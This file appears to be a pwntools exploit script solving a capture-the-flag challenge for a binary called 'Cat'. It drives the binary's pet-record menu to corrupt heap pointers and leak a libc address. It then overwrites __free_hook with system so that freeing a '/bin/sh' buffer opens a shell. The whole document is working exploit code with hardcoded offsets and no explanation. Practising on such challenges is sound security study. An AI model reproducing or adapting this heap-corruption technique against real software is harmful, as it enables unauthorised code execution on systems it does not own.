#!/usr/bin/env python
import pwn
import re

p = pwn.process(['./Cat'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

latohook = 0x1188
latosys = -0x17bba0

def create_record(name, kind, age, rec = 1, sen1 = 0, sen2 = 0):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("1")
    p.recvuntil(">")
    if sen1 == 0:
        p.sendline(name)
    else:
        p.send(name)
    p.recvuntil(">")
    if sen2 == 0:
        p.sendline(kind)
    else:
        p.send(kind)
    p.recvuntil(">")
    p.sendline(str(age))
    return

def edit_record(ID, name, kind, age, choice = "y", rec = 1, sen1 = 0, sen2 = 0, sen3 = 0):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline(str(ID))
    p.recvuntil(">")
    if sen1 == 0:
        p.sendline(name)
    else:
        p.send(name)
    p.recvuntil(">")
    if sen2 == 0:
        p.sendline(kind)
    else:
        p.send(kind)
    p.recvuntil(">")
    p.sendline(str(age))
    p.recvuntil("(y)/n>")
    if sen3 == 0:
        p.sendline(choice)
    else: 
        p.send(choice)
    return

def print_record(ID, rec = 1):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(str(ID))
    r = p.recvuntil("command?")
    return r

def print_all_record(rec = 1):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("4")
    r = p.recvuntil("command?")
    return r

def delete_record(ID, rec = 1):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("5")
    p.recvuntil(">")
    p.sendline(str(ID))
    return

def quit(rec = 1):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("6")
    return

create_record("AA","BBB", 20)
create_record("AA","BBB",20)
create_record("AA","BBB",20)
create_record("AA","BBB",20)
edit_record(0, "AA", "BC", 10, "n")
sen1 = pwn.p64(0x6020b0) + pwn.p64(0x6020c0)
create_record("DD",sen1,11)
edit_record(0,pwn.p64(0x6020b8)+pwn.p64(0x602080), pwn.p64(0x6020c8) + pwn.p64(0x404040), 10, "y")
r = print_record(2)
r = re.search("name.*", r).group(0)[6:]
la = pwn.util.packing.unpack(r, 'all', endian = 'little', signed = False)
print "[+] Address of stdout: "+hex(la)
sys = la + latosys
freehook = la + latohook
print "[+] Address of system: "+hex(sys)
print "[+] Address of free hook: "+hex(freehook)
edit_record(0, "AA", "BC", 10, "n")
sen2 = pwn.p64(0x6020b0) + pwn.p64(0x602200)
create_record("DD",sen2,11)
binsh = "/bin/sh".ljust(8,"\x00")+ pwn.p64(0x6020e0)
edit_record(1,pwn.p64(0x6020b8), binsh, 10, "y")
edit_record(6, "AA", "BC", 10, "n")
sen3 = pwn.p64(freehook) + pwn.p64(0x6020f0)
create_record("DD",sen3,11)
edit_record(6,pwn.p64(sys),pwn.p64(0x602200),10,"n")



print "[+] Shell spawned."
p.interactive()
